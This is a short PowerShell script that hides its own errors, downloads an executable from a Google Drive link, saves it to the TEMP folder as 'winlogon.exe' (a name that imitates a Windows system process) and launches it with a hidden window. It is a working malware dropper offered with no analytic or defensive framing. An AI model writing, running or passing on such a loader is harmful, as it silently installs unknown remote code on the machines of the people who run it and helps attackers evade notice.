
$ErrorActionPreference = 'SilentlyContinue'

$url = "https://drive.usercontent.google.com/download?id=1BSpMkP970V_Mmfm14lAR3bD5gsysKbFJ&export=download&confirm=t&uuid=9ae08bfa-7b85-4a0b-b6ad-f8550c7c2c31"
$ruta = "$env:TEMP\winlogon.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $ruta)
Start-Process -FilePath $ruta -WindowStyle Hidden
